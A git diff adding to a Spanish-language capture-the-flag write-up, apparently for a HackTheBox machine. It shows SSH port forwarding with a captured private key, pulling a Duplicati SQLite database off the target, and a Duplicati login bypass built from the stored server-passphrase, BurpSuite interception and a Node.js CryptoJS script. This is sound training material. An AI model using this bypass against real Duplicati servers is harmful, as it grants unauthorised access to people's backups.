@@ -625,9 +625,88 @@ Length: 2610 (2,5K) [application/octet-stream]
 Saving to: ‘id_rsa’
 ```
 
-Utilizo ssh con la clave de marcus para realizar un local port forwarding y traer el puerto 8200 de la máquina a mi puerto 8200.
+Utilizo ssh con la clave id_rsa de marcus para realizar un local port forwarding y traer el puerto 8200 de la máquina a mi puerto 8200.
 
 ```bash
 ssh -L 8200:127.0.0.1:8200 marcus@10.10.11.30 -i id_rsa -fN
 ```
 
+Accedo al puerto 8200 y observo un panel de Login de Duplicati
+
+![imagen](https://github.com/user-attachments/assets/74f17044-57a1-43a2-a423-85a3341a0737)
+
+Buscando información sobre como explotar Duplicati la primera búsqueda que obtengo es un artículo de como bypassear la autenticación del login
+
+* [Duplicati: Bypassing Login Authentication With Server-passphrase](https://read.martiandefense.llc/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee)
+
+![imagen](https://github.com/user-attachments/assets/1dcba326-593d-41ba-ab31-44fb41e4b451)
+
+> Duplicati es un cliente de copia de seguridad que almacena de forma segura Backups encriptados, incrementales y comprimidos en almacenamiento local, servicios de almacenamiento en la nube y servidores de archivos remotos.
+{: .prompt-info }
+
+El primer paso es encontrar un archivo SQLite el cual contiene los datos relacionados con Duplicati.
+
+```bash
+marcus@monitorsthree:~$ find / -name *.sqlite 2>/dev/null
+/opt/duplicati/config/Duplicati-server.sqlite
+/opt/duplicati/config/CTADPNHLTC.sqlite
+/opt/duplicati/config/XPZCVKDBST.sqlite
+/opt/duplicati/config/RMDKIFCLFY.sqlite
+/opt/duplicati/config/HORORWQEWI.sqlite
+/opt/duplicati/config/ALMLZANKDB.sqlite
+```
+ 
+Con un servidor en Python3 traslado a mi máquina de atacante el archivo Duplicati-server.sqlite
+
+```bash
+marcus@monitorsthree:/opt/duplicati/config$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+```bash
+wget http://10.10.11.30:8000/Duplicati-server.sqlite
+--2025-01-27 18:20:57--  http://10.10.11.30:8000/Duplicati-server.sqlite
+Connecting to 10.10.11.30:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 90112 (88K) [application/vnd.sqlite3]
+Saving to: ‘Duplicati-server.sqlite’
+```
+
+Abro el .sqlite y consigo visualizar el server-passphrase y server-passphrase-salt, esto me servirá para generar una contraseña de inicio de sesión válida
+
+![imagen](https://github.com/user-attachments/assets/e4883b90-d5b0-43ad-9216-af0237ad9b99)
+
+Intercepto la petición de login con BurpSuite con la opción "Do intercept > Response to this request", el Salt coincide con el de la base de datos de Duplicati, pero el Nonce va cambiando cada vez que se introduce una contraseña.
+
+![imagen](https://github.com/user-attachments/assets/4863c055-9379-4a53-896f-b62fee844e27)
+
+Crearé un NoncePwd válido usando CyberChef decodificando el server-passphrase en base64 y el resultado convirtiendolo a hexadecimal 
+
+![imagen](https://github.com/user-attachments/assets/19eb3e8c-4d63-4e6e-8cbe-c1398057880f)
+
+Utilizo el siguiente script en NodeJS y reemplazo los valores de este código, lo que me permite obtener el NoncePwd
+
+```js
+const CryptoJS = require('crypto-js');
+
+var saltedpwd = 'HexOutputFromCyberChef';
+var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('NonceFromBurp') + saltedpwd)).toString(CryptoJS.enc.Base64);
+
+console.log(noncedpwd);
+```
+
+```bash
+node duplicati.js
+ZyuEFXAeiRLOS/bJ5WhMs65SnXEOo4k/d8FgRTzP8U=
+```
+
+Forward en la petición de BurpSuite y pego el NoncePwd en el campo password
+
+![imagen](https://github.com/user-attachments/assets/68b926fa-1cb2-4bc2-9b23-af846ea0f51b)
+
+> Después de pegar el NoncePwd en el campo password usar (Ctrl+U) para URL encodearlo en BurpSuite
+{: .prompt-info }
+
+Dejo correr la petición y obtengo acceso al panel de Duplicati
+
+![imagen](https://github.com/user-attachments/assets/2cc802c7-4454-48e2-9fe2-fa2e1c6cc5eb)
